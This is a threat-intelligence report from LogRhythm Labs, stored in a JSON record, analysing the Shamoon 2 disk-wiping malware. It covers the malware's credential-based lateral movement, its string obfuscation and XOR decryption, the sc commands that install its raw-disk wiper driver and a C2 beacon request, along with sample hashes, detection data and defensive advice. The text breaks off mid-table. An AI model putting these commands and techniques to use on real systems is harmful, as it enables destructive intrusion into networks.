{
    "id": "591f0847-61d1-414d-a6f1-fe4f28e9a05e",
    "created_at": "2022-11-23T12:04:25.824119Z",
    "updated_at": "2025-03-27T02:05:34.363224Z",
    "deleted_at": null,
    "sha1_hash": "62aaf9f7ec39f6d8f5df14070132137f11fb74b9",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-04-11T16:50:23Z",
    "file_modification_date": "2017-04-11T16:50:26Z",
    "file_size": 2690901,
    "plain_text": "# SHAMOON 2 MALWARE  ANALYSIS REPORT\n\n#### Part 1 | LogRhythm Labs\n\nApril 2017\n\n\n-----\n\n#### Table of Contents\n\n**3  Executive Summary**\n\n3  About Shamoon 2\n\n3  About this Report\n\n4  Major Findings\n\n4  Remediation Recommendations\n\n**5  Analysis**\n\n6  Summary\n\n6  Sample Analyzed: 394a7.exe\n\n6  Analysis\n\n6  Obfuscation and Encryption\n\n7  Execution\n\n**10  Prevention and Remediation**\n\n**11  Conclusion**\n\n**12  Appendix A: Sample Metadata**\n\n13  Description\n\n13  Sample: 394a7.exe\n\n14  Dropped File: netinit.exe\n\n15  Dropped File: <filename>.exe (variable file name)\n\n16  Sample: drdisk.sys\n\n17  Sample: 448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237\n\n17  Sample: 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac3\n\n18  Sample: c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\n18  Sample: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\n19  Sample: e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a\n\n**20  Appendix B: LogRhythm Detection Rules**\n\n21  Description\n\n21  LogRhythm AI Engine Rules\n\n21  Pre-Dropper AI Engine Rule\n\n21  Dropper AI Engine Rules\n\n23  C2 Reporting AI Engine Rules\n\n24  Wiper-Specific AI Engine Rule\n\n25  LogRhythm SmartResponse Plug-ins\n\n25  Disable AD Account\n\n26  Disable Local System Account\n\n27  Quarantine by IP Address – Cisco Specific\n\n28  Quarantine by IP Address – Palo Alto Networks Specific\n\n**29  Appendix C: Indicators of Compromise (IOCs)**\n\n30  Description\n\n**31  About LogRhythm**\n\n**31  About LogRhythm Labs**\n\n\n-----\n\n###### SHAMOON 2 MALWARE ANALYSIS REPORT\n\n\n-----\n\n|set c back t|lock o 2012|\n|---|---|\n\n\n###### Major Findings\n\n - A service named “NtsSrv,” configured to run the original\nmalicious installer, is created and started on the initially\ninfected victim.\n\n - The installer attempts to enumerate other systems on\nthe local network or Active Directory domain.\n\n - If connection to a system on the local network is\nsuccessful, the installer performs the following:\n\n-- \u0007Attempts to log to the remote system with hardcoded\ncredentials and copy itself to %WinDir%\\system32\\\nntssrvr32.exe.\n\n-- \u0007Decrypts and executes a Command and Control (C2)\ncomponent from its resource section, which attempts\nto communicate over HTTP with a local system\nnamed “server”.\n\n-- \u0007Installs a Scheduled Task on the remote system that\nis configured to run ntssrvr32.exe.\n\n-- \u0007Starts the Scheduled Task on the remote system,\nwhich drops a wiper component that renders the\nsystem inoperable.\n\n - If the system date of the original victim is later than\n11/20/2016 8:45 PM, the installer drops the wiper\ncomponent and proceeds to overwrite files until the\noriginal victim system is rendered inoperable.\n\n\n###### Remediation Recommendations\nIf the malware is successful in wiping the affected systems,\nanalysts can remediate this malware from a system or\nnetwork by restoring from backup. In order to prevent\nfuture infection and lateral movement of the malware\nacross the enterprise, the following actions can be taken in\naddition to implementing the LogRhythm rules provided in\nAppendix B. Because these mitigations have implications\nacross the enterprise network, it is important to assess the\nimpact of making these changes and ensure appropriate\npolicies and procedures to implement and support these\nchanges are evaluated.\n\n - Ensure the latest account credential protection is\nenabled on all Windows systems by verifying that\nenterprise systems are kept updated with the latest\nWindows Update software.\n\n - Install Local Administrator Password Solution (LAPS)\non the domain in order to randomize local administrator\npasswords for systems in the domain.\n\n - Disable the Remote Registry service on all systems.\n\n-- Note: This action can have significant impact on\nthe enterprise network and should be carefully\nconsidered. However, the service can be disabled\ntemporarily and easily re-enabled when mitigation\nis complete.\n\n\n-----\n\n## Analysis\n\n\n-----\n\n#### Analysis\n\n###### Summary\nThe main installer infects and destroys the initial system,\nas well as infecting other systems on the local network or\nActive Directory domain. The malware contains hardcoded\ndomains, usernames, and passwords for logging on to\nremote systems. If the installer is successful in connecting\nto the local network, it drops a communications component\nthat is configured to connect to a hardcoded server name.\nNotably, the malware uses the same disk driver to perform\nthe wiping functionality as malware used in an attack named\n“Shamoon” in 2012. The sample analyzed is a 32-bit version\nof the malware; file metadata for all identified samples and\ndropped files is presented in Appendix A.\n\n###### Sample Analyzed: 394a7.exe\n\n**File Metadata**\n\nFile Name: 394a7.exe\n\nFile Size (bytes): 395,264\n\nMD5: 5446f46d89124462ae7aca4fce420423\n\nSHA1: e7c7f41babdb279c099526ece03ede9076edca4e\n\nSHA256: 394a7ebad5dfc13d6c75945a61063470dc3b68f7a\n207613b79ef000e1990909b\n\nFile Type: 32-bit Windows executable\n\nTable 1: File Metadata\n\n###### Analysis\nThe main installer contains three embedded resources\nnamed PKCS12, PKCS7, and x509, which are encrypted\ncomponents of the malware, named to masquerade as\nlegitimate cryptographic objects. These resources are\ndecrypted and dropped on either the initially infected or\nremote system, depending on the operating system and\nother factors.\n\nFigure 1: Disassembly of Decryption Algorithm\n\n\n###### Obfuscation and Encryption\nResource names, service names, and other strings are\nencoded in the binary using a simple algorithm. These\nstrings are decoded at runtime by subtracting a value from\neach character to get the corresponding ASCII value. For\nexample, subtracting 34 from each character in “rmeuST”\nresults in the resource name string “PKCS12”:\n\nASCII Character \"r\" \"m\" \"e\" \"u\" \"S\" \"T\"\n\nHex Value 0x72 0x6D 0x65 0x75 0x53 0x54\n\nHex Value – 34 (0x22) 0x50 0x4B 0x43 0x53 0x31 0x32\n\nDecoded ASCII \"P\" \"K\" \"C\" \"S\" \"1\" \"2\"\n\nThe embedded resources themselves are XOR encrypted\nusing a key that is decoded at runtime before decryption.\nThe encrypted data are stored at a particular offset within\neach binary resource; the offset values are hardcoded in the\nbinary as encoded strings. Decryption proceeds as follows:\n\n - Starting offset and size are decoded from the hardcoded\nvalues in the binary\n\n-- Nineteen is subtracted from the ASCII value of each\ncharacter, then the resulting ASCII value is converted\nto an integer, e.g. “KJL” -> “879” (str) -> 879 (int).\n\n - The decryption key is decoded in the same way\n(subtracting 19 from each ASCII value), but the result is a\nBase64 encoded value that is then decoded to result in\nthe final key.\n\n - Starting at the calculated offset within the resource,\neach byte is XOR decrypted with the decoded key as\nseen in the assembly below:\n\n|ASCII Character|\"r\"|\"m\"|\"e\"|\"u\"|\"S\"|\"T\"|\n|---|---|---|---|---|---|---|\n|Hex Value|0x72|0x6D|0x65|0x75|0x53|0x54|\n|Hex Value – 34 (0x22)|0x50|0x4B|0x43|0x53|0x31|0x32|\n|Decoded ASCII|\"P\"|\"K\"|\"C\"|\"S\"|\"1\"|\"2\"|\n\n|Sample Analyzed: 394a7.exe|Col2|\n|---|---|\n|File Metadata||\n|File Name:|394a7.exe|\n|File Size (bytes):|395,264|\n|MD5:|5446f46d89124462ae7aca4fce420423|\n|SHA1:|e7c7f41babdb279c099526ece03ede9076edca4e|\n|SHA256:|394a7ebad5dfc13d6c75945a61063470dc3b68f7a 207613b79ef000e1990909b|\n|File Type:|32-bit Windows executable|\n\n\n-----\n\n###### Execution\nWhen the analyzed sample 3947a.exe is executed with the\nparameter “2”, the sample installs itself as a service named\nNtsSrv on the infected host and modifies the dependencies\nof the legitimate LanmanWorkstation service to include the\nmalicious service.\n\nAfter determining the subnet of the infected machine,\n3947a.exe attempts to connect to network shares on the\nlocal network starting with the ADMIN$ share. The malware\ntraverses the network incrementally by IP address starting\nat 1, using hardcoded domain credentials to log on to each\nsystem. If the installer successfully connects to another host\non the subnet, it proceeds by remotely opening that system’s\nregistry in order to disable UAC and Wow64 redirection.\nThis allows the malware to test write permissions to the\n%WinDir%\\system32 directory, where it writes itself as\nntssrvr32.exe and changes the timestamp of the file to\nmatch that of kernel32.dll.\n\nFigure 2: Job Creation Over the Network\n\n\n3947a.exe then attempts to create a scheduled task on\nthe remote system that is configured to run the installer\ncomponent with the command line “ntssrvr32.exe\nLocalService”. The task is created on the remote system\nusing the NetScheduleJobAdd API, which only allows\nspecification of a host and AT_INFO structure to create the\njob. Notably, the AT_INFO structure does not contain a field\nfor specifying a task name, resulting in a default name (e.g.\nAt1.job) being assigned to the scheduled task. However, the\nAT_INFO structure does allow specification of a start time\nfor the task, which the installer generates by retrieving\nthe system time of the remote machine and adding 90\nmilliseconds. Following is a screenshot from a network\ncapture that illustrates the job creation over the network:\n\n\n-----\n\nThe installer then decrypts its PKCS12 resource (the\nwiper component), writes the data to %WinDir%\\\nSystem32\\<filename>.exe on the initially infected machine,\nand changes the timestamp of the file to match that\nof kernel32.dll.\n\n3947a.exe also writes a hardcoded public key to\n%TEMP%\\key8854321.pub—the purpose of which was not\ndetermined during the course of analysis. This component\nis then executed with the command line “%WinDir%\\\nsystem32\\<filename>.exe 1”. The <filename> is chosen from\nthe list of hardcoded values below:\n\ncaclsrv.exe dvdquery.exe msinit.exe sigver.exe wcscript.exe\n\nclean.exe event.exe ntfrsutil.exe routeman.exe ntnw.exe\n\ncertutl.exe findfile.exe ntdsutl.exe rrasrv.exe netx.exe\n\nctrl.exe gpget.exe power.exe sacses.exe fsutl.exe\n\ndfrag.exe ipsecure.exe rdsadmin.exe sfmsc.exe extract.exe\n\ndnslookup.exe iissrv.exe regsys.exe smbinit.exe\n\nFigure 3: List of Hardcoded Values from Which <filename> is Chosen\n\n\n<filename>.exe extracts and XOR decrypts the disk\ndriver from its resource section, writing it to %WinDir%\\\nsystem32\\drivers\\drdisk.sys. The wiping component then\ncreates a service named drdisk that is configured with\nthe driver drdisk.sys as the kernel driver. The service is\ncreated and then started by the wiping component using\nthe following commands:\n\n“%WinDir%\\system32\\cmd.exe /c sc create drdisk type= kernel start= demand binpath=\nSystem32\\Drivers\\drdisk.sys 2>&1 >nul”\n\n“%WinDir%\\system32\\cmd.exe /c sc start drdisk 2>&1 >nul”\n\nThe system clock is then set to a random day in August\n2012 (possibly due to the license expiration of the original\ndriver, although this is unconfirmed). <filename>.exe then\nbegins overwriting files on the system, starting with\nuser directories and followed by the system directory\n%WinDir%\\system32.\n\nFigure 4: Illustration of the Modified System Time and Service Creation\n\n|caclsrv.exe|dvdquery.exe|msinit.exe|sigver.exe|wcscript.exe|\n|---|---|---|---|---|\n|clean.exe|event.exe|ntfrsutil.exe|routeman.exe|ntnw.exe|\n|certutl.exe|findfile.exe|ntdsutl.exe|rrasrv.exe|netx.exe|\n|ctrl.exe|gpget.exe|power.exe|sacses.exe|fsutl.exe|\n|dfrag.exe|ipsecure.exe|rdsadmin.exe|sfmsc.exe|extract.exe|\n|dnslookup.exe|iissrv.exe|regsys.exe|smbinit.exe||\n\n\n-----\n\nIf the previously described remote connection is\nsuccessful, 3947a.exe decrypts the communications\ncomponent contained within its PKCS7 resource, writes\nit to %WinDir%\\system32\\netinit.exe, and changes the\ntimestamp of the file to match that of kernel32.dll.\n\nWhen executed with the command line “%WinDir%\\\nsystem32\\netinit.exe 1”, the communications component\nsearches for a machine on the local subnet with the\nhostname “server”. If found, the component connects to\nport 80 and performs the following GET request, where the\n“shinu=” argument contains encoded system information:\n\nGET\n\n/category/page.php?shinu=9L5/959g6H0WBv8wadq7HLBsVheuQTk4tInwkYjRpEggrEEIR1E\nu1FcsiZyF+j0PoY3VlOMpZPvgxsW2 HTTP/1.1\n\nUser-Agent: Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)\n\nHost: server\n\nCache-Control: no-cache\n\nFigure 5: Pseudocode for Setting Wiping Date and Checking System Time\n\n\nDue to the hardcoded wiping date of 11/20/2016, the\nmalware is unlikely to spread successfully to other\nmachines, because the initial victim is wiped within\nminutes of infection. Unless the disk driver installation\nis unsuccessful, the system is wiped before the infection\ncan spread to other hosts. However, if the malware is\nable to retrieve the file inf_usbvideo324.pnf from the C2\nserver, this hardcoded date could be altered to a future\ndate. This file is saved to %WinDir%\\inf\\usbvideo324.\npnf. The following pseudocode illustrates the check for\nthis file, which contains an alternate day and year for the\nscheduled wiping, followed by the hardcoded values and\nthe modification of the system time.\n\n\n-----\n\n## Prevention and Remediation\n\n\n## Prevention and Remediation\n\n\n-----\n\n#### Prevention and Remediation\n\n###### Prevention\nIn order to prevent future infection and lateral movement of\nthe malware across the enterprise, the following actions can\nbe taken in addition to implementing the LogRhythm rules\nprovided in Appendix B. Because these mitigations have\nimplications across the enterprise network, it is important\nto assess the impact of making these changes and ensure\nappropriate policies and procedures to implement and\nsupport these changes are evaluated.\n\nThe Shamoon malware does not rely on exploiting\napplication or operating system vulnerabilities to\nbe successful.[6] Instead, it uses hardcoded Windows\nActive Directory credentials and weak domain security\nconfigurations to infect and spread across the enterprise.\nPrevention of this type of attack requires hardening of the\nsecurity policy on the network. Following are examples of\nsecurity measures that should be implemented and how\neach prevents attacks such as Shamoon:\n\n1. \u0007Ensure the latest account credential protection is\nenabled on all Windows systems by verifying that\nenterprise systems are kept updated with the latest\nWindows Update software. Microsoft’s 2871997 update[7]\n(released May 13th, 2014) improves account credential\nsecurity, making credential dumping attacks less\nsuccessful. This helps to prevent the harvesting of\ndomain credentials that can be used for subsequent\nattacks and lateral movement across a domain.\n\n2. \u0007On May 1, 2015, Microsoft made the Local Administrator\nPassword Solution (LAPS) software available for\ndownload.[8] When installed, LAPS makes the elevation\nof local credentials to domain credentials more difficult\nby ensuring the local administrator account password\nis not reused on every domain system. This prevents\nlateral movement by an attacker using the same\ncredentials to logon to multiple systems.\n\n3. \u0007Disable the Remote Registry service on all systems.[9]\nShamoon relies on the Remote Registry system to\ndisable User Account Control on the remote target,\nallowing the malware to install itself in the %WinDir%\\\nsystem32 directory and create a Scheduled Task\nwithout alerting the user.\n\n\n###### Remediation\nIf the malware is successful in wiping the affected systems,\nanalysts can remediate this malware from a system or\nnetwork only by restoring from backup.\n\n#### Conclusion\n\nThe Shamoon malware campaign began in 2012 and reemerged with a new, modified version of the 2012 samples\nin November 2016. In that month, there were two targeted\nwaves of attacks that attempted to wipe systems across\nnetworks of multiple Saudi Arabian industries. A third wave\nof attacks occurred in January of 2017, again targeting\nSaudi Arabian industries. Although the responsible actors\nfor the third wave of attacks are presumed to be the\nsame, the malware was updated with more sophisticated\nfunctionality such as encryption, anti-debugging, and\nprocess hollowing techniques.[10]\n\nIntelligence gained from security researchers investigating\nthese waves of attacks suggests that the Shamoon campaign\nis ongoing. Research published by Kaspersky[11] reports\nthat a new wiper (which they have named StoneDrill) was\ndiscovered in Europe, suggesting that the actor group may\nbe expanding their operations beyond the Middle East. For\nthis reason, LogRhythm Threat Research will continue to\nmonitor Shamoon activity, and report on the analysis of any\nfuture discoveries.\n\n\n6 As an initial delivery vector was not recovered by the analysts, the method used to drop the Shamoon binary is unknown.\n\n7 https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13,-2014\n\n8 https://technet.microsoft.com/library/security/3062591\n\n9 \u0007Note: This action can have significant impact on the enterprise network and should be carefully considered. However, the service can be disabled\ntemporarily and easily re-enabled when mitigation is complete.\n\n10 https://www.revbits.com/pdf/RevBits-Threat-Intelligence-Report-Feb2017.pdf\n\n11 https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf\n\n\n-----\n\n## Appendix A: Sample Metadata\n\n\n## Appendix A: Sample Metadata\n\n\n-----\n\n#### Appendix A: Sample Metadata\n\n###### Description\nThe following appendix contains metadata and other information about each identified sample for the purposes of\nreference and correlation.\n\n###### Sample: 394a7.exe\n394a7.exe is the initial dropper that installs itself as a service, installs the wiper component as a service, executes the C2\ncomponent, and performs lateral movement to infect remote systems. The C2 component was observed to call back to the\nhostname “server” during the course of analysis.\n\n**File Metadata**\n\nFile Name: 394a7.exe\n\nFile Size (bytes): 395,264\n\nMD5: 5446f46d89124462ae7aca4fce420423\n\nSHA256: 394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n\nFile Type: PE32 executable for MS Windows (console) Intel 80386 32-bit\n\nCompile Time: 2009-02-15 12:31:44 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira TR/Dropper.Gen 8.3.3.4 20170111\n\nClamAV Win.Dropper.DistTrack-7 0.99.2.0 20170111\n\nESET-NOD32 Win32/DistTrack.C 14753 20170111\n\nF-Secure Trojan.GenericKD.3749853 11.0.19100.45 20170111\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13 20170111\n\nMcAfee DistTrack!raw 6.0.6.653 20170108\n\nMicrosoft Trojan:Win32/Depriz.A!dha 1.1.13407.0 20170111\n\nSophos Troj/Agent-AUOR 4.98.0 20170111\n\nSymantec W32.Disttrack.B None 20170111\n\nTrend Micro Not Detected\n\nTable 2: Sample Metadata\n\n|File Metadata|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Name:|394a7.exe||||\n|File Size (bytes):|395,264||||\n|MD5:|5446f46d89124462ae7aca4fce420423||||\n|SHA256:|394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b||||\n|File Type:|PE32 executable for MS Windows (console) Intel 80386 32-bit||||\n|Compile Time:|2009-02-15 12:31:44 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|TR/Dropper.Gen|8.3.3.4|20170111|\n||ClamAV|Win.Dropper.DistTrack-7|0.99.2.0|20170111|\n||ESET-NOD32|Win32/DistTrack.C|14753|20170111|\n||F-Secure|Trojan.GenericKD.3749853|11.0.19100.45|20170111|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20170111|\n||McAfee|DistTrack!raw|6.0.6.653|20170108|\n||Microsoft|Trojan:Win32/Depriz.A!dha|1.1.13407.0|20170111|\n||Sophos|Troj/Agent-AUOR|4.98.0|20170111|\n||Symantec|W32.Disttrack.B|None|20170111|\n||Trend Micro|Not Detected|||\n\n\n-----\n\n###### Dropped File: netinit.exe\nThe dropped file netinit.exe is the C2 component and was observed to call back to the hostname “server”\nduring the course of analysis.\n\n**File Metadata**\n\nFile Name: 61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\n\nFile Size (bytes): 159744\n\nMD5: 5bac4381c00044d7f4e4cbfd368ba03b\n\nSHA256: 61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\n\nFile Type: PE32 executable for MS Windows (console) Intel 80386 32-bit\n\nCompile Time: 2009-02-15 12:29:20 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira TR/Agent.ynjhe 8.3.3.4 20170110\n\nClamAV Win.Malware.DistTrack-9 0.99.2.0 20170111\n\nESET-NOD32 Variant of Win32/DistTrack.B 14748 20170111\n\nF-Secure Trojan.Generic.19784887 11.0.19100.45 20170111\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13 20170111\n\nMcAfee DistTrack!comm 6.0.6.653 20170108\n\nMicrosoft None 1.1.13407.0 20170111\n\nSophos Troj/Agent-AUOR 4.98.0 20170110\n\nSymantec Not Detected 20151.1.1.4 20161206\n\nTrend Micro Not Detected\n\nTable 3: Sample Metadata\n\n|File Metadata|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Name:|61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842||||\n|File Size (bytes):|159744||||\n|MD5:|5bac4381c00044d7f4e4cbfd368ba03b||||\n|SHA256:|61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842||||\n|File Type:|PE32 executable for MS Windows (console) Intel 80386 32-bit||||\n|Compile Time:|2009-02-15 12:29:20 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|TR/Agent.ynjhe|8.3.3.4|20170110|\n||ClamAV|Win.Malware.DistTrack-9|0.99.2.0|20170111|\n||ESET-NOD32|Variant of Win32/DistTrack.B|14748|20170111|\n||F-Secure|Trojan.Generic.19784887|11.0.19100.45|20170111|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20170111|\n||McAfee|DistTrack!comm|6.0.6.653|20170108|\n||Microsoft|None|1.1.13407.0|20170111|\n||Sophos|Troj/Agent-AUOR|4.98.0|20170110|\n||Symantec|Not Detected|20151.1.1.4|20161206|\n||Trend Micro|Not Detected|||\n\n\n-----\n\n###### Dropped File: <filename>.exe (variable file name)\nThe variable file name for the dropped file <filename>.exe is chosen at runtime from a list of names that are hardcoded in\nthe binary. This file is responsible for installing the service configured to run the disk driver that overwrites the system files\nand partition tables.\n\n**File Metadata**\n\nFile Name: 128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n\nFile Size (bytes): 282112\n\nMD5: 2cd0a5f1e9bcce6807e57ec8477d222a\n\nSHA256: 128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n\nFile Type: PE32 executable for MS Windows (console) Intel 80386 32-bit\n\nCompile Time: 2009-02-15 12:30:19 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira TR/Agent.axwlp 8.3.3.4 20161208\n\nClamAV Win.Trojan.DistTrack-6 0.99.2.0 20161208\n\nESET-NOD32 Win32/DistTrack.C 14574 20161208\n\nF-Secure Trojan.Generic.19780901 11.0.19100.45 20161208\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13 20161208\n\nMcAfee RDN/Generic.dx 6.0.6.653 20161205\n\nMicrosoft Trojan:Win32/Depriz.C!dha 1.1.13303.0 20161208\n\nSophos Troj/Agent-AUOR 4.98.0 20161208\n\nSymantec W32.Disttrack.B 20151.1.1.4 20161208\n\nTrend Micro Not Detected\n\nTable 4: Sample Metadata\n\n|File Metadata|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Name:|128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd||||\n|File Size (bytes):|282112||||\n|MD5:|2cd0a5f1e9bcce6807e57ec8477d222a||||\n|SHA256:|128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd||||\n|File Type:|PE32 executable for MS Windows (console) Intel 80386 32-bit||||\n|Compile Time:|2009-02-15 12:30:19 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|TR/Agent.axwlp|8.3.3.4|20161208|\n||ClamAV|Win.Trojan.DistTrack-6|0.99.2.0|20161208|\n||ESET-NOD32|Win32/DistTrack.C|14574|20161208|\n||F-Secure|Trojan.Generic.19780901|11.0.19100.45|20161208|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20161208|\n||McAfee|RDN/Generic.dx|6.0.6.653|20161205|\n||Microsoft|Trojan:Win32/Depriz.C!dha|1.1.13303.0|20161208|\n||Sophos|Troj/Agent-AUOR|4.98.0|20161208|\n||Symantec|W32.Disttrack.B|20151.1.1.4|20161208|\n||Trend Micro|Not Detected|||\n\n\n-----\n\n###### Sample: drdisk.sys\nThe dropped file drdisk.sys is a legitimate disk driver known as RawDisk, licensed by EldoS Corporation. This file is a kernel\ndriver that allows low-level access to the system’s hard disk.\n\n**File Metadata**\n\nFile Name: drdisk.sys\n\nFile Size (bytes): 27280\n\nMD5: 1493d342e7a36553c56b2adea150949e\n\nSHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\n\nFile Type: PE32 executable for MS Windows (native) Intel 80386 32-bit\n\nCompile Time: 2011-12-28 16:51:24 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira None 8.3.3.4 20161214\n\nClamAV Win.Trojan.Disttrak-1 0.99.2.0 20161214\n\nESET-NOD32 None 14603 20161214\n\nF-Secure None 11.0.19100.45 20161214\n\nKaspersky RiskTool.Win32.RawAccess.a 15.0.1.13 20161214\n\nMcAfee DistTrack!sys 6.0.6.653 20161214\n\nMicrosoft None 1.1.13303.0 20161214\n\nSophos RawDisk Driver (PUA) 4.98.0 20161214\n\nSymantec None 20151.1.1.4 20161214\n\nTrend Micro Not Detected\n\nTable 5: Sample Metadata\n\n|File Metadata|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Name:|drdisk.sys||||\n|File Size (bytes):|27280||||\n|MD5:|1493d342e7a36553c56b2adea150949e||||\n|SHA256:|4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6||||\n|File Type:|PE32 executable for MS Windows (native) Intel 80386 32-bit||||\n|Compile Time:|2011-12-28 16:51:24 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|None|8.3.3.4|20161214|\n||ClamAV|Win.Trojan.Disttrak-1|0.99.2.0|20161214|\n||ESET-NOD32|None|14603|20161214|\n||F-Secure|None|11.0.19100.45|20161214|\n||Kaspersky|RiskTool.Win32.RawAccess.a|15.0.1.13|20161214|\n||McAfee|DistTrack!sys|6.0.6.653|20161214|\n||Microsoft|None|1.1.13303.0|20161214|\n||Sophos|RawDisk Driver (PUA)|4.98.0|20161214|\n||Symantec|None|20151.1.1.4|20161214|\n||Trend Micro|Not Detected|||\n\n\n-----\n\nThe following are additional DistTrack samples/components that were identified during research and analysis.\n\n###### Sample: 448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237\n\n**File Metadata**\n\nFile Name: 448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237\n\nFile Size (bytes): 1355640\n\nMD5: 5289f4b806bbd7893fbda3ce4025683e\n\nSHA256: 448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237\n\nFile Type: PE32 executable for MS Windows (console) Intel 80386 32-bit\n\nCompile Time: 2009-02-15 12:31:44 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira TR/Dropper.Gen 8.3.3.4 20161206\n\nClamAV Win.Dropper.DistTrack-7 0.99.2.0 20161206\n\nESET-NOD32 Win32/DistTrack.C 14561 20161206\n\nF-Secure Trojan.GenericKD.3803417 11.0.19100.45 20161206\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13 20161206\n\nMcAfee Artemis!5289F4B806BB 6.0.6.653 20161205\n\nMicrosoft Trojan:Win32/Depriz.A!dha 1.1.13303.0 20161206\n\nSophos Mal/Generic-S 4.98.0 20161206\n\nSymantec W32.Disttrack.B 20151.1.1.4 20161206\n\nTrend Micro Not Detected\n\nTable 6: Sample Metadata\n\n###### Sample: 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac3\n\n**File Metadata**\n\nFile Name: 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\nFile Size (bytes): 717312\n\nMD5: 8fbe990c2d493f58a2afa2b746e49c86\n\nSHA256: 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\nFile Type: PE32+ executable for MS Windows (console) Mono/.Net assembly\n\nCompile Time: 2009-02-15 12:32:19 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version** **Update**\n\nAvira None 8.3.3.4 20170108\n\nClamAV Win.Dropper.DistTrack-8 0.99.2.0 20170109\n\nESET-NOD32 Win64/DistTrack.C 14736 20170108\n\nF-Secure Worm.Generic.898650 11.0.19100.45 20170109\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13 20170109\n\nMcAfee DistTrack!raw 6.0.6.653 20170108\n\nMicrosoft Trojan:Win32/Depriz.C!dha 1.1.13303.0 20170109\n\nSophos Troj/Agent-AUMG 4.98.0 20170109\n\nSymantec Not Detected\n\nTrend Micro Not Detected\n\nTable 7: Sample Metadata\n\n|Sample: 448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Metadata|||||\n|File Name:|448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237||||\n|File Size (bytes):|1355640||||\n|MD5:|5289f4b806bbd7893fbda3ce4025683e||||\n|SHA256:|448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237||||\n|File Type:|PE32 executable for MS Windows (console) Intel 80386 32-bit||||\n|Compile Time:|2009-02-15 12:31:44 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|TR/Dropper.Gen|8.3.3.4|20161206|\n||ClamAV|Win.Dropper.DistTrack-7|0.99.2.0|20161206|\n||ESET-NOD32|Win32/DistTrack.C|14561|20161206|\n||F-Secure|Trojan.GenericKD.3803417|11.0.19100.45|20161206|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20161206|\n||McAfee|Artemis!5289F4B806BB|6.0.6.653|20161205|\n||Microsoft|Trojan:Win32/Depriz.A!dha|1.1.13303.0|20161206|\n||Sophos|Mal/Generic-S|4.98.0|20161206|\n||Symantec|W32.Disttrack.B|20151.1.1.4|20161206|\n||Trend Micro|Not Detected|||\n\n|Sample: 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac3|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Metadata|||||\n|File Name:|47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34||||\n|File Size 